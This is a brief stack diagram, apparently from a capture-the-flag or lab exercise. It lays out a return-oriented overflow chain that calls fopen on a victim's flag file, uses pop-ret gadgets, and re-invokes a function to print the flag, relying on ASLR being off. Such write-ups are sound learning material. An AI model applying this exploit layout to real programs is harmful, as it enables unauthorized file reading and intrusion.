  [higher]
  +-----------
  |trickme arg[0] -> file ptr of flag.txt, no change without ASLR, directly write here
  +-----------
  |dummy
  +-----------
  |trickme() -> recall this function to print, a easy way :)
  +-----------
  |f open arg[1] -> "r"
  +-----------
  |f open arg[0] -> "/home/victim/flag.txt" (stored few bytes up)
  +-----------
  |pop;pop;ret; (skip the 2 args for fopen)
  +-----------
  |fopen() -> open the file and store the value in $eax
  +-----------
  |original f (to make the file close normally)
  +-----------
  |original RET-> pop;ret;  (skip the original file ptr f)
  +-----------
  |original ebp
